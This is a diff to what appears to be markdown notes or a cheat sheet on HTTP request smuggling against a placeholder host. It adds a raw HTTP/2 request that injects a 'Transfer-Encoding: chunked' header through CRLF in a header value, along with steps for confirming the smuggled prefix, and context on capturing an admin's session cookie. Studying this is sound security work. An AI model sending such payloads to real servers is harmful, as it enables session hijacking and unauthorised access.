@@ -109,15 +109,16 @@ Host: vulnerable-website.com
 Most of the time, you will receive your own 404 response. Any other response code indicates that you have successfully captured a response intended for the admin user. Repeat this process until you capture a 302 response containing the admin's new post-login session cookie.
 
 ## HTTP/2 request smuggling via CRLF injection
-<table>
-    <tr>
-        <td>foo</td>
-        <td>
-            <p>bar\r\n<br>
-            Transfer-Encoding: chunked</p>
-        </td>
-    </tr>
-</table>
+```
+POST / HTTP/2
+Host: vulnerable-website.com
+Foo: bar\r\nTransfer-Encoding: chunked
+
+0
+
+SMUGGLED
+```
+Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix.
 
 ## HTTP/2 request splitting via CRLF injection
 <table>
